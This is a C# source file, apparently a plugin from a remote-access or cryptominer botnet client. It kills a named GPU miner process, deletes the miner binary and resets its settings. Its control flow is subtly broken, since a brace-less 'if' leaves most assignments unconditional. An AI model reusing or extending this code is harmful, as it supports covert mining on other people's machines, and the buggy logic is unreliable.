using System;
using System.Diagnostics;
using System.IO;
using System.Threading;

namespace Plugin
{
    class Gpu_Del // Gpu_Del.Get();
    {
        public static void Get(string gpuBin, string gpuProc, string gpuWorkDir, string gpuZipPass, string gpu_idParameters, string gpuParametrs, string gpuDelay)
        {
            try
            {
                if (File.Exists(gpuBin))
                    foreach (Process p in Process.GetProcessesByName(gpuProc))
                    {
                        p.Kill();
                        Thread.Sleep(2000);
                    }
                if (File.Exists(gpuBin))
                    File.Delete(gpuBin);

                if (!File.Exists(gpuBin))

                    gpuParametrs = "1"; // Launch parameters
                gpuProc = "1"; // In the archive
                gpuWorkDir = "1";
                gpuZipPass = "1";
                gpuDelay = "1";
                gpuBin = "1";
                gpu_idParameters = "0";


            }
            catch (Exception ex)
            {
                Packet.Error(ex.Message);
                return;
            }
        }
    }
}
